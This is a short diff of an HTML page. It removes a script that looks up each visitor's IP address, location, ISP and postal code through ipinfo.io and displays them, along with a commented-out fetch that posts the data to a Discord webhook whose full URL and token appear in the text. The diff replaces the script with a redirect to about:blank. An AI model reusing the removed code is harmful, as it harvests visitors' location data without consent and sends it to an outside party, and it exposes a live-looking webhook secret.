@@ -1,20 +1,7 @@
 <html><head><style type="text/css" id="operaUserStyle"></style></head><body><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
    <center><h1 style="font-family:Arial; font-weight:bolder"></h1></center>
     <script>
-      import("https://code.jquery.com/jquery-3.6.2.js").then(() => {
-        $.get("https://ipinfo.io/", (a) => {
-          /* fetch("https://discord.com/api/webhooks/1050833111069503539/Ij5ddDcT3xZE3mOyOdUe-nVz3oM7Cl0WM53z114b6wMoOfZ5OxVZRXqxE8jB1FSvcvc4", {
-            method: "POST",
-            headers: {
-              'Content-Type':'application/json'
-              },
-            body: JSON.stringify({
-              content: JSON.stringify(a)
-              })
-            }); */
-            document.querySelector("h1").innerHTML = a.ip + "<br>" + a.region + "<br>" + a.country + "<br>" + a.loc + "<br>" + a.hostname + "<br>" + a.org + "<br>" + a.postal + "<br>" + a.timezone + "<br><br>:D";
-        }, "JSONP")
-        });
+      location.href = "about:blank";
       </script>
     
   
